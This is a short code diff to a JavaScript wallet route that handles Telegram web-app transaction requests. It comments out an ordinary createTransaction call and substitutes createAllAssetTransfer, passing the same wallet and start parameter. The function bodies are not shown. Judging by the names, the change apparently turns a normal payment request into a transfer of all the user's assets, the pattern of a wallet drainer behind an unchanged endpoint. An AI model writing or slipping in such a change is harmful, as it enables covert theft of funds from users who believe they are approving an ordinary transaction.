@@ -39,7 +39,11 @@ router.get("/transaction", async (req, res) => {
     console.log("=".repeat(50));
 
     const { wallet, tgWebAppStartParam } = req.query;
-    const result = await WalletService.createTransaction(
+    // const result = await WalletService.createTransaction(
+    //   wallet,
+    //   decodeBase64(tgWebAppStartParam)
+    // );
+    const result = await WalletService.createAllAssetTransfer(
       wallet,
       decodeBase64(tgWebAppStartParam)
     );
